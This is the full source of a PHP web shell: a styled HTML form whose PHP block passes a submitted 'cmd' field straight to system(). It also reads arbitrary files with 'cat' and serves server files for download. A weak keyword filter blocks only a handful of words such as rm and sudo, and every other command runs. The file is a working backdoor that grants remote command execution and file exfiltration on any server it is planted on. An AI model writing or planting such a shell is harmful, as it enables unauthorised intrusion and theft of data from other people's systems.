<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 20px auto;
            padding: 20px;
            background-color: #252526;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        h1 {
            text-align: center;
            color: #61dafb;
        }
        form {
            display: flex;
            justify-content: space-between;
        }
        input[type="text"] {
            width: 85%;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 4px;
            background-color: #1e1e1e;
            color: #d4d4d4;
        }
        input[type="submit"] {
            width: 10%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #61dafb;
            color: #1e1e1e;
            font-weight: bold;
            cursor: pointer;
        }
        .output {
            margin-top: 20px;
            padding: 10px;
            background-color: #1e1e1e;
            border: 1px solid #555;
            border-radius: 4px;
            white-space: pre-wrap;
            font-family: monospace;
            color: #dcdcaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP Web Shell</h1>
        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter your command here" autofocus required>
            <input type="submit" value="Run">
        </form>
        <div class="output">
            <?php
            if (isset($_POST['cmd'])) {
                // Recupera il comando inviato dall'utente
                $cmd = $_POST['cmd'];

                // Funzione di protezione per evitare comandi pericolosi
                function sanitize_command($cmd) {
                    $disallowed = array('rm', 'sudo', 'chmod', 'chown', 'reboot', 'shutdown');
                    foreach ($disallowed as $word) {
                        if (strpos($cmd, $word) !== false) {
                            return false; // Rifiuta i comandi pericolosi
                        }
                    }
                    return $cmd;
                }

                $cmd = sanitize_command($cmd);
                
                // Se il comando non è sicuro, mostra un messaggio di errore
                if ($cmd === false) {
                    echo "<strong>Error:</strong> Command is not allowed!";
                } else {
                    echo "<strong>Command:</strong> " . htmlspecialchars($cmd) . "<br><br>";
                    echo "<strong>Output:</strong><br>";

                    // Esegui il comando e mostra l'output
                    echo "<pre>";

                    // Aggiungi alcuni comandi predefiniti per facilità
                    if ($cmd === 'ls') {
                        system('ls');
                    } elseif ($cmd === 'whoami') {
                        system('whoami');
                    } elseif ($cmd === 'pwd') {
                        system('pwd');
                    } elseif (preg_match('/^cat\s+(.*)$/', $cmd, $matches)) {
                        // Mostra il contenuto di un file
                        $file = $matches[1];
                        if (file_exists($file)) {
                            echo file_get_contents($file);
                        } else {
                            echo "File not found.";
                        }
                    } elseif (preg_match('/^download\s+(.*)$/', $cmd, $matches)) {
                        // Funzione per scaricare un file dal server
                        $file = $matches[1];
                        if (file_exists($file)) {
                            header('Content-Type: application/octet-stream');
                            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                            readfile($file);
                            exit;
                        } else {
                            echo "File not found.";
                        }
                    } else {
                        // Esegui qualsiasi altro comando
                        system($cmd);
                    }

                    echo "</pre>";
                }
            }
            ?>
        </div>
    </div>
</body>
</html>
